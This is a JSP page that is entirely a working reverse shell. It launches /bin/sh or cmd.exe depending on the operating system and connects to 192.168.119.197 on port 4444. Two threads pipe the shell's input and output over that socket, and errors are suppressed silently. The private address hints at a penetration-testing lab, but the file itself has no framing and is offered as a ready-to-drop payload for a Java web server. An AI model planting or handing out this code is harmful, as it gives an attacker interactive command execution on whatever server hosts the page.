<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream wr;
    OutputStream ze;

    StreamConnector( InputStream wr, OutputStream ze )
    {
      this.wr = wr;
      this.ze = ze;
    }

    public void run()
    {
      BufferedReader dq  = null;
      BufferedWriter aob = null;
      try
      {
        dq  = new BufferedReader( new InputStreamReader( this.wr ) );
        aob = new BufferedWriter( new OutputStreamWriter( this.ze ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = dq.read( buffer, 0, buffer.length ) ) > 0 )
        {
          aob.write( buffer, 0, length );
          aob.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( dq != null )
          dq.close();
        if( aob != null )
          aob.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.197", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
